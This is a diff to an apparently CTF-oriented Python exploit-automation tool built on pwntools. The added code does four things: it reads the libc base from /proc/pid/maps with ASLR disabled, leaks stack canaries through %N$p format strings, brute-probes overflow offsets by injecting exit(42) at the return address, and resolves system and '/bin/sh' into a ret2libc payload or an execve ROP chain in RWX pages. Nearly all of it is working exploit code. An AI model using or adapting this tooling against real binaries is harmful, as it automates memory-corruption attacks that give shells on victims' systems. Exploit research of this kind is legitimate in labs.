@@ -3,7 +3,9 @@ from __future__ import annotations
 
 import os
 import subprocess
+import sys
 import tempfile
+import termios
 import threading
 import time
 from dataclasses import dataclass, field
@@ -78,6 +80,101 @@ def _read_rwx_pages(pid: int, out: list[tuple[int, bytes]]) -> None:
                 pass
     finally:
         mem_fd.close()
+
+
+def _read_libc_base(pid: int) -> int | None:
+    """Extract libc ELF base from /proc/pid/maps.
+
+    The ELF base is the load address of the segment that maps file offset 0
+    (the ELF header).  Searching for the r-xp (executable) segment is wrong
+    because it maps at a non-zero file offset — subtracting that offset gives
+    the correct base.  We use the simpler approach of finding the mapping with
+    file offset == 0 directly.
+    """
+    try:
+        maps = Path(f"/proc/{pid}/maps").read_text()
+    except OSError:
+        return None
+    for line in maps.splitlines():
+        if "libc" not in line:
+            continue
+        parts = line.split()
+        if len(parts) < 5:
+            continue
+        try:
+            file_offset = int(parts[2], 16)
+            if file_offset == 0:
+                return int(parts[0].split("-")[0], 16)
+        except (ValueError, IndexError):
+            pass
+    return None
+
+
+def probe_libc_base(
+    binary: Path,
+    input_mode: str,
+    cfg: Config,
+    verbose: bool = False,
+) -> int | None:
+    """Run the binary, pause before it exits, read libc base from /proc/maps.
+
+    Works reliably when ASLR is disabled (setarch -R in wrapper), because libc
+    loads at the same address every run — no leak stage needed.
+    """
+    wrapper = cfg.wrapper_parts()
+    env = dict(cfg.env)
+    libc_base: int | None = None
+
+    if input_mode in ("file-raw", "file-size-data"):
+        fifo = Path(tempfile.mktemp(suffix=".lb_probe"))
+        os.mkfifo(str(fifo))
+        try:
+            proc = subprocess.Popen(
+                wrapper + [str(binary), str(fifo)],
+                env=env,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+            time.sleep(0.4)
+            libc_base = _read_libc_base(proc.pid)
+            if verbose:
+                print(f"    libc probe: pid={proc.pid} base={hex(libc_base) if libc_base else 'not found'}")
+
+            def _write_fifo() -> None:
+                try:
+                    with open(str(fifo), "wb") as f:
+                        f.write(b"4 AAAA\n" if input_mode == "file-size-data" else b"AAAA")
+                except OSError:
+                    pass
+
+            t = threading.Thread(target=_write_fifo, daemon=True)
+            t.start()
+            proc.wait(timeout=5)
+            t.join(timeout=2)
+        except Exception as exc:
+            if verbose:
+                print(f"    libc probe error: {exc}")
+        finally:
+            fifo.unlink(missing_ok=True)
+    else:
+        proc = subprocess.Popen(
+            wrapper + [str(binary)],
+            env=env,
+            stdin=subprocess.PIPE,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+        time.sleep(0.2)
+        libc_base = _read_libc_base(proc.pid)
+        if verbose:
+            print(f"    libc probe: pid={proc.pid} base={hex(libc_base) if libc_base else 'not found'}")
+        try:
+            proc.stdin.close()  # type: ignore[union-attr]
+        except OSError:
+            pass
+        proc.wait(timeout=3)
+
+    return libc_base
 
 
 def scan_runtime_rwx_pages(
@@ -329,6 +426,21 @@ def scan_shellcode_addr(
         context.log_level = saved_log
 
 
+def _canary_from_output(out: str) -> int | None:
+    """Return the first hex token that looks like a stack canary (low byte == 0x00)."""
+    for token in out.split():
+        tok = token.strip("(),\n\r")
+        if not tok.lower().startswith("0x"):
+            continue
+        try:
+            val = int(tok, 16)
+            if (val & 0xff) == 0x00 and val != 0 and val < 0x100000000:
+                return val
+        except ValueError:
+            pass
+    return None
+
+
 def probe_canary_fmt(
     binary: Path,
     input_mode: str,
@@ -340,23 +452,229 @@ def probe_canary_fmt(
 
     Returns (position, canary_value) or None.
     Canary heuristic: 4-byte value whose low byte is 0x00 and isn't all-zeros.
+
+    For file-based binaries the format string goes via stdin (the binary reads a
+    name/prompt from stdin and echoes it back), while the binary also receives a
+    minimal valid file as argv[1].
     """
+    if input_mode in ("file-raw", "file-size-data"):
+        return _probe_canary_fmt_file(binary, input_mode, cfg, max_pos, verbose)
+
     for pos in range(1, max_pos + 1):
         fmt = f"%{pos}$p".encode()
         rc, out = _run_and_capture(binary, input_mode, fmt, cfg)
         if verbose:
             print(f"    pos {pos:2d}: {out.strip()[:60]}")
-        for token in out.split():
-            tok = token.strip("(),\n\r")
-            if tok.lower().startswith("0x"):
-                try:
-                    val = int(tok, 16)
-                    # Canary: low byte 0x00, non-zero, fits in 32 bits
-                    if (val & 0xff) == 0x00 and val != 0 and val < 0x100000000:
-                        return pos, val
-                except ValueError:
-                    pass
+        val = _canary_from_output(out)
+        if val is not None:
+            return pos, val
     return None
+
+
+def _probe_canary_fmt_file(
+    binary: Path,
+    input_mode: str,
+    cfg: Config,
+    max_pos: int = 64,
+    verbose: bool = False,
+) -> tuple[int, int] | None:
+    """Probe when binary takes a file arg AND reads the format string from stdin.
+
+    Creates a minimal valid input file (just 4 bytes), then sends %N$p via stdin
+    and looks for the canary in stdout+stderr.
+    """
+    wrapper = cfg.wrapper_parts()
+    env = dict(cfg.env)
+
+    # Minimal valid content for each file format
+    if input_mode == "file-size-data":
+        file_data = b"4 AAAA\n"
+    else:
+        file_data = b"AAAA"
+
+    with tempfile.NamedTemporaryFile(mode="wb", suffix=".fmt_probe", delete=False) as f:
+        f.write(file_data)
+        probe_file = Path(f.name)
+
+    try:
+        for pos in range(1, max_pos + 1):
+            # Send format string as the "name" stdin input, then Enter to continue
+            stdin_data = f"%{pos}$p\n\n".encode()
+            try:
+                r = subprocess.run(
+                    wrapper + [str(binary), str(probe_file)],
+                    input=stdin_data,
+                    capture_output=True,
+                    env=env,
+                    timeout=5,
+                )
+                out = (r.stdout + r.stderr).decode("latin-1", errors="replace")
+            except Exception:
+                continue
+
+            if verbose:
+                print(f"    pos {pos:2d}: {out.strip()[:80]}")
+
+            val = _canary_from_output(out)
+            if val is not None:
+                return pos, val
+    finally:
+        probe_file.unlink(missing_ok=True)
+
+    return None
+
+
+def probe_canary_offset_file(
+    binary: Path,
+    input_mode: str,
+    canary_pos: int,
+    offset: int | None,
+    cfg: Config,
+    verbose: bool = False,
+) -> tuple[int, int | None] | None:
+    """Find OFFSET_TO_CANARY and (if possible) the total stack OFFSET.
+
+    Phase 1 — vary fill size n from 4 to PROBE_SIZE in steps of 4.  Each probe
+    writes exactly PROBE_SIZE bytes: A*n + canary + B*(PROBE_SIZE-n-4).  When
+    the written canary aligns with the actual canary slot the check passes
+    (rc != SIGABRT) — that n is OFFSET_TO_CANARY.
+
+    Phase 2 — inject exit(42) at the return-address slot.  Payload:
+    A*canary_off + canary + B*regs + exit_addr + 42.  When exit_addr lands at
+    the true return address the binary calls exit(42) → rc == 42.  Corrupting
+    saved EBP (the common false positive) causes SIGSEGV (rc == -11), not 42,
+    so there are no false positives.  OFFSET = canary_off + 4 + regs.
+
+    Returns (canary_off, total_offset) — total_offset may be None if Phase 2 fails.
+    Returns None if canary_off cannot be determined.
+    """
+    import struct
+
+    try:
+        from pwn import process as pwn_process  # type: ignore
+    except ImportError:
+        return None
+
+    PROBE_SIZE = 128          # big enough to overflow any reasonable stack frame
+    wrapper = cfg.wrapper_parts()
+    env = dict(cfg.env)
+    fifo_path = Path(tempfile.mktemp(suffix=".co_probe"))
+    os.mkfifo(str(fifo_path))
+
+    def _one_probe(build_payload):
+        """Run one binary instance: leak canary, feed payload(canary), return rc."""
+        fifo_fd = os.open(str(fifo_path), os.O_RDWR)
+        proc = None
+        try:
+            proc = pwn_process(
+                wrapper + [str(binary), str(fifo_path)],
+                env=env,
+                stdin=subprocess.PIPE,
+                level="error",
+            )
+            proc.sendlineafter(b"name", f"%{canary_pos}$p".encode(), timeout=3)
+            out = proc.recvuntil(b"continue", timeout=3)
+            canary_val = _canary_from_output(out.decode("latin-1", errors="replace"))
+            if canary_val is None or (canary_val & 0xFF) != 0x00:
+                return None, None
+            test = build_payload(canary_val)
+            file_data = (str(len(test)).encode() + b" " + test
+                         if input_mode == "file-size-data" else test)
+            os.write(fifo_fd, file_data)
+            proc.sendline(b"")
+            proc.wait_for_close(timeout=5)
+            return canary_val, proc.poll()
+        except Exception as exc:
+            if verbose:
+                print(f"    probe error: {exc}")
+            return None, None
+        finally:
+            try:
+                os.close(fifo_fd)
+            except OSError:
+                pass
+            if proc is not None:
+                try:
+                    proc.close()
+                except Exception:
+                    pass
+
+    # Save terminal state before spawning any pwntools processes.  The probes
+    # use stdin=PIPE so pwntools won't touch the TTY, but save/restore here is
+    # a belt-and-suspenders guard against any future regression.
+    _saved_term: list | None = None
+    try:
+        _saved_term = termios.tcgetattr(sys.stdin.fileno())
+    except Exception:
+        pass
+
+    try:
+        # ── Phase 1: find OFFSET_TO_CANARY ────────────────────────────────────
+        # Write exactly PROBE_SIZE bytes each time so the overflow always reaches
+        # well past the return address.  The canary lands at position n; when n
+        # matches the actual canary slot the check passes (rc != SIGABRT).
+        canary_off = None
+        for n in range(4, PROBE_SIZE - 4, 4):
+            def _p1(cv, _n=n):
+                pad = PROBE_SIZE - _n - 4
+                return b"A" * _n + struct.pack("<I", cv) + b"B" * pad
+            canary_val, rc = _one_probe(_p1)
+            if rc is None:
+                continue
+            if verbose:
+                canary_hex = hex(canary_val) if canary_val else "?"
+                print(f"    canary_offset {n:3d}: exit={rc} canary={canary_hex}")
+            if rc not in (-6, 134):  # not SIGABRT → canary check passed
+                canary_off = n
+                break
+
+        if canary_off is None:
+            return None
+
+        # ── Phase 2: find OFFSET by injecting exit(42) at the return-address slot
+        # For each regs, build: A*canary_off + canary + B*regs + exit_addr + 42
+        # When the exit_addr lands at the true return-address slot, the binary
+        # calls exit(42) and the process exits with code 42.  Any earlier hit
+        # (e.g., saved-EBP corruption causing SIGSEGV) gives a different code.
+        # This avoids the false-positive SIGSEGV from corrupting saved EBP.
+        EXIT_MARKER = 42
+        exit_addr = None
+        try:
+            from pwn import ELF as _ELF
+            _elf = _ELF(str(binary), checksec=False)
+            exit_addr = (_elf.symbols.get("exit") or _elf.symbols.get("_exit")
+                         or _elf.plt.get("exit") or _elf.plt.get("_exit"))
+        except Exception:
+            pass
+
+        total_offset = None
+        if exit_addr is not None:
+            for regs in range(0, 64, 4):
+                def _p2(cv, _r=regs, _co=canary_off, _ea=exit_addr):
+                    # Layout after ret: [exit_addr][fake_ret_for_exit][exit_arg]
+                    # exit() reads its argument from [ESP+4] (not [ESP+0]).
+                    return (b"A" * _co + struct.pack("<I", cv)
+                            + b"B" * _r + struct.pack("<III", _ea, 0, EXIT_MARKER))
+                _, rc = _one_probe(_p2)
+                if rc is None:
+                    continue
+                if verbose:
+                    print(f"    total_offset {canary_off + 4 + regs:3d}: exit={rc} regs={regs}")
+                if rc == EXIT_MARKER:
+                    total_offset = canary_off + 4 + regs
+                    break
+        elif verbose:
+            print("    total_offset: exit() not found in binary, skipping Phase 2")
+
+        return (canary_off, total_offset)
+
+    finally:
+        fifo_path.unlink(missing_ok=True)
+        if _saved_term is not None:
+            try:
+                termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN, _saved_term)
+            except Exception:
+                pass
 
 
 def _rop_chain_items(r: ReconResult, cfg: Config) -> list[tuple[str, int]]:
@@ -497,8 +815,48 @@ def solve(
                     missing = _EXECVE_REQUIRED - gadgets.keys()
                     res.notes.append(f"Partial rwx gadgets — missing: {sorted(missing)}")
             else:
-                res.notes.append("No rwx pages found at runtime — libc leak required")
-                res.notes.append("system() not in PLT — need libc base (see rop strategy)")
+                # No rwx pages and no system@PLT.
+                # ASLR is typically disabled via setarch -R in the wrapper, so libc
+                # loads at a fixed address every run.  Probe that address directly
+                # instead of requiring a two-stage leak exploit.
+                if r.libc_path:
+                    if verbose:
+                        print("  No rwx pages — probing libc base (ASLR should be off) …")
+                    libc_base = probe_libc_base(r.binary, strat.input_mode, cfg, verbose=verbose)
+                    if libc_base:
+                        try:
+                            from pwn import ELF, context  # type: ignore
+                            context.arch = cfg.target.arch
+                            context.log_level = "error"
+                            libc = ELF(r.libc_path, checksec=False)
+                            resolved_system = libc_base + libc.symbols["system"]
+                            resolved_binsh = libc_base + next(libc.search(b"/bin/sh"))
+                            res.addresses["system"] = resolved_system
+                            res.addresses["binsh"] = resolved_binsh
+                            strat.addresses["system"] = resolved_system
+                            strat.addresses["binsh"] = resolved_binsh
+                            res.notes.append(
+                                f"libc base probed @ {hex(libc_base)} (ASLR disabled) — "
+                                "system and /bin/sh resolved without leak stage"
+                            )
+                            if strat.offset is not None:
+                                total = strat.offset + 12
+                                res.payload_layout = (
+                                    f"[{strat.offset}x 'A'] [p32({hex(resolved_system)})] "
+                                    f"[p32(0x41414141)] [p32({hex(resolved_binsh)})]"
+                                    f"  →  {total} bytes total"
+                                )
+                            if verbose:
+                                print(f"  ✓ system={hex(resolved_system)}  /bin/sh={hex(resolved_binsh)}")
+                        except Exception as exc:
+                            res.notes.append(f"libc base found but symbol resolution failed: {exc}")
+                            res.notes.append("system() not in PLT — need libc base (see rop strategy)")
+                    else:
+                        res.notes.append("No rwx pages found at runtime — libc leak required")
+                        res.notes.append("system() not in PLT — need libc base (see rop strategy)")
+                else:
+                    res.notes.append("No rwx pages found at runtime — libc leak required")
+                    res.notes.append("system() not in PLT — need libc base (see rop strategy)")
 
     elif strat.name == "rop":
         items = _rop_chain_items(r, cfg)
@@ -516,11 +874,62 @@ def solve(
         found = probe_canary_fmt(r.binary, strat.input_mode, cfg, verbose=verbose)
         if found:
             res.canary_pos, res.canary = found
+            # Remove the stale "find CANARY_FMT_POS" todo now that we've resolved it
+            strat.todos = [t for t in strat.todos if "CANARY_FMT_POS" not in t]
+
+            # Probe for the exact fill length before the canary (and total offset)
+            if strat.input_mode in ("file-raw", "file-size-data"):
+                if verbose:
+                    print("  Probing OFFSET_TO_CANARY...")
+                result = probe_canary_offset_file(
+                    r.binary, strat.input_mode, res.canary_pos,
+                    strat.offset, cfg, verbose=verbose,
+                )
+                if result is not None:
+                    canary_off, found_offset = result
+                    strat.addresses["canary_off"] = canary_off
+                    strat.todos = [t for t in strat.todos if "OFFSET_TO_CANARY" not in t]
+                    if verbose:
+                        print(f"  ✓ OFFSET_TO_CANARY = {canary_off}")
+                    if found_offset is not None and strat.offset is None:
+                        strat.offset = found_offset
+                        strat.todos = [t for t in strat.todos if "OFFSET" not in t]
+                        if verbose:
+                            print(f"  ✓ OFFSET = {found_offset} (auto-probed)")
         else:
             res.notes.append(
                 "Canary not found via format string — binary may not echo output or "
                 "format vuln uses a different input path"
             )
+
+        # Also scan for RWX execve gadgets (statically linked binaries with embedded chains)
+        if cfg.target.arch == "i386":
+            if verbose:
+                print("  Scanning runtime memory for rwx pages with execve gadgets...")
+            pages = scan_runtime_rwx_pages(r.binary, strat.input_mode, cfg, verbose=verbose)
+            if pages:
+                gadgets = find_execve_gadgets_i386(pages)
+                if verbose:
+                    print(f"  gadgets found: {list(gadgets.keys())}")
+                if _EXECVE_REQUIRED.issubset(gadgets.keys()):
+                    rwx_base = pages[0][0]
+                    binsh_ptr = rwx_base + 0x500
+                    strat.name = "canary-fmt-rop-rwx"
+                    strat.addresses.update(gadgets)
+                    strat.addresses["BINSH"] = binsh_ptr
+                    if found:
+                        strat.addresses["canary_pos"] = res.canary_pos
+                    res.addresses.update(gadgets)
+                    res.addresses["BINSH"] = binsh_ptr
+                    res.notes.append(
+                        f"Found execve gadgets in rwx page @ {hex(rwx_base)} — "
+                        "canary fmt-leak + ROP execve chain"
+                    )
+                    if verbose:
+                        print(f"  ✓ strategy upgraded to canary-fmt-rop-rwx (rwx base={hex(rwx_base)})")
+                else:
+                    missing = _EXECVE_REQUIRED - gadgets.keys()
+                    res.notes.append(f"Partial rwx gadgets — missing: {sorted(missing)}")
 
     elif strat.name == "canary-brute":
         res.notes.append("Brute-force canary: fork() detected — byte-by-byte attack viable")
